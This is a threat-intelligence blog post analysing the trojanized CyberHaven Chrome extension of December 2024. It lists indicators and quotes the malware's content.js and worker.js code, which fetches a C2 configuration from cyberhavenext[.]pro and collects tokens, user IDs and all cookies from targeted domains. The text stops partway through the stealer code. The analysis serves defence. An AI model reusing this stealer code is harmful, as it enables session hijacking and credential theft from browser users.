<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Trojanized Chrome Extensions" /><meta property="og:locale" content="en" /><meta name="description" content="I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that “the browser is the new OS”, so it only makes sense for threat actors to write and deliver malware that runs in the context of the browser." /><meta property="og:description" content="I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that “the browser is the new OS”, so it only makes sense for threat actors to write and deliver malware that runs in the context of the browser." /><link rel="canonical" href="https://dmpdump.github.io/posts/TrojanizedChromeExtensions/" /><meta property="og:url" content="https://dmpdump.github.io/posts/TrojanizedChromeExtensions/" /><meta property="og:site_name" content="dmpdump" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-12-29T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Trojanized Chrome Extensions" /><meta name="twitter:site" content="@G60930953" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-30T03:37:22+00:00","datePublished":"2024-12-29T00:00:00+00:00","description":"I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that “the browser is the new OS”, so it only makes sense for threat actors to write and deliver malware that runs in the context of the browser.","headline":"Trojanized Chrome Extensions","mainEntityOfPage":{"@type":"WebPage","@id":"https://dmpdump.github.io/posts/TrojanizedChromeExtensions/"},"url":"https://dmpdump.github.io/posts/TrojanizedChromeExtensions/"}</script><title>Trojanized Chrome Extensions | dmpdump</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="dmpdump"><meta name="application-name" content="dmpdump"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">dmpdump</a></h1><p class="site-subtitle fst-italic mb-0">CTI, RE, Programming</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dmpdump" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/G60930953" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dmpdump','tuta.io'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Trojanized Chrome Extensions</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Trojanized Chrome Extensions</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1735430400" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 29, 2024 </time> </span> <span> Updated <time data-ts="1735529842" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 29, 2024 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/dmpdump">dmpdump</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2167 words" > <em>12 min</em> read</span></div></div></div></header><div class="content"><p>I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that “the browser is the new OS”, so it only makes sense for threat actors to write and deliver malware that runs in the context of the browser.</p><p>On December 26, 2024, it <a href="https://x.com/cstanley/status/1872365853318225931">became public</a> that CyberHaven, a DLP security company, had been breached. In their <a href="https://www.cyberhaven.com/blog/cyberhavens-chrome-extension-security-incident-and-what-were-doing-about-it">breach</a> notification, CyberHaven described the incident as a phishing attack that was used to add a malicious OAuth Google application named “Privacy Policy”, with access to see, update, or publish Chrome Web Store Extensions. With this access, the threat actor published a trojanized version of the CyberHaven extension (version 24.10.4, hash:DDF8C9C72B1B1061221A597168f9BB2C2BA09D38D7B3405E1DACE37AF1587944). Pivoting on the IP address that the domain in the malicious CyberHaven extension resolved to, <a href="https://x.com/jaimeblascob/status/1872445912175534278">it was identified</a> that a few other trojanized extensions shared similar malicious code.</p><p>The malicious domain used in the malicious extension, cyberhavenext[.]pro and subdomain api.cyberhavenext[.]pro, resolved to IP addresses 149.28.124[.]84 and 149.248.2[.]160. Passive DNS (PDNS) resolutions show other domains served by the same IP address which were used in the compromise of other Chrome extensions which share the same malicious code.</p><p><a href="/assets/images/badext/baddomains.png" class="popup img-link shimmer"><img src="/assets/images/badext/baddomains.png" alt="sshot" loading="lazy"></a></p><p><u>149.28.124[.]84</u></p><p><a href="/assets/images/badext/pdns.png" class="popup img-link shimmer"><img src="/assets/images/badext/pdns.png" alt="sshot" loading="lazy"></a></p><p><u>149.248.2[.]160</u></p><p><a href="/assets/images/badext/pdns2.png" class="popup img-link shimmer"><img src="/assets/images/badext/pdns2.png" alt="sshot" loading="lazy"></a></p><p>This seemed like a good opportunity to dig deeper into the internals of a malicious Chrome extension.</p><h1 id="anatomy-of-a-chrome-extension">Anatomy of a Chrome Extension</h1><p>Chrome extensions are a set of files organized in a hierarchical structure, packed as a .crx file (which can be unpacked as a regular archive). The main components are:</p><ul><li>The manifest file, a JSON file which defines permissions, metadata, and the files/scripts used by the extension<li>The content scripts, which interact with the loaded web pages and communicate with background scripts<li>The background/worker scripts, which run in the backend of the extension, listening for events. In manifest version 3, background scripts were replaced with a service worker<li>UI components, such as pop-up scripts. These are the front-end components of the extension</ul><p>Content scripts can communicate with service workers <a href="https://developer.chrome.com/docs/extensions/develop/concepts/messaging">using the messaging API</a>, which include methods such as:</p><ul><li><code class="language-plaintext highlighter-rouge">runtime.sendMessage()</code> to send a single message<li><code class="language-plaintext highlighter-rouge">tabs.sendMessage()</code> to send a single message<li><code class="language-plaintext highlighter-rouge">sendResponse()</code> to respond to a message synchronously<li><code class="language-plaintext highlighter-rouge">runtime.onMessage()</code> to set up an event listener</ul><p><a href="/assets/images/badext/chrome_ext_arch.png" class="popup img-link shimmer"><img src="/assets/images/badext/chrome_ext_arch.png" alt="sshot" loading="lazy"></a></p><h1 id="trojanized-cyberhaven-scripts">Trojanized CyberHaven scripts</h1><p>The content and background scripts of the trojanized CyberHaven extension were shared publicly.</p><ul><li><code class="language-plaintext highlighter-rouge">content.js</code>: AC5CC8BCC05AC27A8F189134C2E3300863B317FB<li><code class="language-plaintext highlighter-rouge">worker.js</code>: 0B871BDEE9D8302A48D6D6511228CAF67A08EC60</ul><p><u>Content.js</u></p><p>This is a new script added by the threat actor which interacts with the websites that the victim visits. It implements a listener and a series of actions depending on a comparison between the current URL and URLs decoded from a configuration retrieved from the threat actor C2 (retrieved in <code class="language-plaintext highlighter-rouge">worker.js</code>).</p><p><code class="language-plaintext highlighter-rouge">Content.js</code> sets up an event listener, if the incoming message is <code class="language-plaintext highlighter-rouge">getScreenSize</code>, it returns the screen size and width.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nf">addListener</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Message received:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">e</span><span class="p">),</span> <span class="dl">'</span><span class="s1">getScreenSize</span><span class="dl">'</span> <span class="o">===</span> <span class="nx">e</span><span class="p">.</span><span class="nx">command</span> <span class="o">&amp;&amp;</span> <span class="nf">a</span><span class="p">({</span>
		<span class="na">screenWidth</span><span class="p">:</span> <span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">width</span><span class="p">,</span>
		<span class="na">screenHeight</span><span class="p">:</span> <span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">height</span>
	<span class="p">});</span>
</pre></table></code></div></div><p>It then implements an async function which gets data from <code class="language-plaintext highlighter-rouge">cyberhavenext_ext_manage</code>, a local storage object with the configuration received from the threat actor C2. If the data from <code class="language-plaintext highlighter-rouge">cyberhavenext_ext_manage</code> exists and the code is not 2000, it checks if the current URL (using <code class="language-plaintext highlighter-rouge">document.href</code>) is in the base64-decoded configuration.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="p">{</span><span class="na">cyberhavenext_ext_manage</span><span class="p">:</span> <span class="nx">t</span><span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nf">get</span><span class="p">([</span><span class="dl">'</span><span class="s1">cyberhavenext_ext_manage</span><span class="dl">'</span><span class="p">]);</span>
		<span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span> <span class="p">?</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">:</span> <span class="kc">null</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error retrieving data from storage:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="mi">2000</span> <span class="o">!==</span> <span class="nx">e</span><span class="p">.</span><span class="nx">code</span> <span class="p">?</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextc</span><span class="p">)))</span>
</pre></table></code></div></div><p>The retrieved encoded configuration is no longer available, but it was shared by CyberHaven:</p><p><a href="/assets/images/badext/decoded_config_cyberh.png" class="popup img-link shimmer"><img src="/assets/images/badext/decoded_config_cyberh.png" alt="sshot" loading="lazy"></a></p><p>The script subsequently performs parsing actions in <code class="language-plaintext highlighter-rouge">cyberhavenext-text</code> and <code class="language-plaintext highlighter-rouge">cyberhavenext-rjson</code> and sends a message to <code class="language-plaintext highlighter-rouge">worker.js</code> with action <code class="language-plaintext highlighter-rouge">cyberhavenext-text</code>, including payload <code class="language-plaintext highlighter-rouge">pl</code> to <code class="language-plaintext highlighter-rouge">worker.js</code>, which contains sensitive data such as tokens and userids from the targeted URLs.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
	<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rtext</span><span class="dl">'</span><span class="p">,</span>
	<span class="na">url</span><span class="p">:</span> <span class="nx">t</span>
<span class="p">},</span> <span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="kd">const</span> <span class="nx">i</span> <span class="o">=</span> <span class="sr">/6kU.*</span><span class="se">?</span><span class="sr">"/gm</span><span class="p">;</span>
	<span class="kd">let</span> <span class="nx">w</span><span class="p">,</span> <span class="nx">k</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
	<span class="k">for </span><span class="p">(;</span> <span class="kc">null</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">w</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nf">exec</span><span class="p">(</span><span class="nx">t</span><span class="p">));)</span>
		<span class="nx">k</span> <span class="o">=</span> <span class="nx">w</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
		<span class="kd">let</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">s</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
		<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
			<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">url</span><span class="p">:</span> <span class="nx">r</span> <span class="o">+</span> <span class="nx">t</span>
		<span class="p">},</span> <span class="k">async</span> <span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="kd">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">r</span><span class="p">;</span>
			<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
				<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">url</span><span class="p">:</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">t</span>
			<span class="p">},</span> <span class="k">async</span> <span class="nx">a</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
				<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
					<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">,</span>
					<span class="na">url</span><span class="p">:</span> <span class="nx">V</span> <span class="o">+</span> <span class="nx">t</span>
				<span class="p">},</span> <span class="k">async</span> <span class="nx">a</span> <span class="o">=&gt;</span> <span class="p">{</span>
					<span class="kd">const</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
					<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
						<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-check-errors</span><span class="dl">'</span><span class="p">,</span>
						<span class="na">url</span><span class="p">:</span> <span class="nx">o</span><span class="p">,</span>
						<span class="na">pl</span><span class="p">:</span> <span class="p">{</span>
							<span class="na">dm</span><span class="p">:</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextc</span><span class="p">),</span>
							<span class="na">openapi_tk</span><span class="p">:</span> <span class="nx">t</span><span class="p">,</span>
							<span class="na">openapi_u</span><span class="p">:</span> <span class="nx">i</span><span class="p">,</span>
							<span class="na">cyberhavenext_cx</span><span class="p">:</span> <span class="nx">r</span><span class="p">,</span>
							<span class="na">gpta</span><span class="p">:</span> <span class="nx">w</span><span class="p">,</span>
							<span class="na">uid</span><span class="p">:</span> <span class="nx">s</span><span class="p">,</span>
							<span class="na">hed</span><span class="p">:</span> <span class="nx">n</span><span class="p">,</span>
							<span class="na">n</span><span class="p">:</span> <span class="nx">c</span><span class="p">,</span>
							<span class="na">r</span><span class="p">:</span> <span class="nx">l</span><span class="p">,</span>
							<span class="na">k</span><span class="p">:</span> <span class="dl">''</span>
						<span class="p">}</span>
</pre></table></code></div></div><p><u>Worker.js</u></p><p>In order to understand how the data is exfiltrated, we need to look at the actions implemented in <code class="language-plaintext highlighter-rouge">worker.js</code> and how they interact with <code class="language-plaintext highlighter-rouge">content.js</code>. The legitimate <code class="language-plaintext highlighter-rouge">worker.js</code> from the CyberHaven extension had malicious code appended to it. This malicious script is responsible for retrieving the encoded configuration from the threat actor infrastructure, storing it in <code class="language-plaintext highlighter-rouge">cyberhavenext_ext_manage</code>. It also implements a switch/case statement with various actions based on messages sent from <code class="language-plaintext highlighter-rouge">content.js</code>. Here we can see that the encoded configuration with the target URLs is retrieved from cyberhavenext[.]pro:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> <span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://cyberhavenext[.]pro/ai-cyberhaven</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
			<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
				<span class="na">Accept</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json, application/xml, text/plain, text/html, *.*</span><span class="dl">'</span><span class="p">,</span>
				<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
			<span class="p">}</span>
		<span class="p">});</span>
		<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">t</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span>
			<span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="s2">`HTTP error! Status: </span><span class="p">${</span> <span class="nx">t</span><span class="p">.</span><span class="nx">status</span> <span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">();</span>
		<span class="k">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nf">set</span><span class="p">({</span> <span class="na">cyberhavenext_ext_manage</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">}),</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Data successfully stored!</span><span class="dl">'</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">An error occurred:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">t</span><span class="p">);</span>
	<span class="p">}</span>
</pre></table></code></div></div><p>We can also see that the <code class="language-plaintext highlighter-rouge">cyberhavenext-text</code> and <code class="language-plaintext highlighter-rouge">cyberhavenext-rjson</code> actions are parsers:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-rtext</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">text</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">();</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">();</span>
		<span class="k">break</span><span class="p">;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">cyberhavenext-check-errors</code> is the key stealer action. Here we can see how messages received from <code class="language-plaintext highlighter-rouge">content.js</code> are used to extract, encode, and send sensitive data, including all cookies, from the targeted domains.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-check-errors</span><span class="dl">'</span><span class="p">:</span>
		<span class="kd">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">pl</span><span class="p">;</span>
		<span class="kd">let</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">dm</span><span class="p">;</span>
		<span class="nx">chrome</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nf">getAll</span><span class="p">({</span> <span class="na">domain</span><span class="p">:</span> <span class="nx">n</span> <span class="p">},</span> <span class="nx">n</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="k">if </span><span class="p">(</span><span class="nx">n</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">({</span>
						<span class="na">domain</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">domain</span><span class="p">,</span>
						<span class="na">expirationDate</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">expirationDate</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
						<span class="na">hostOnly</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">hostOnly</span><span class="p">,</span>
						<span class="na">httpOnly</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">httpOnly</span><span class="p">,</span>
						<span class="na">name</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
						<span class="na">path</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span>
						<span class="na">sameSite</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">sameSite</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
						<span class="na">secure</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">secure</span><span class="p">,</span>
						<span class="na">session</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">session</span><span class="p">,</span>
						<span class="na">storeId</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">storeId</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
						<span class="na">value</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">value</span>
					<span class="p">})),</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">n</span><span class="p">;</span>
				<span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
				<span class="k">try</span> <span class="p">{</span>
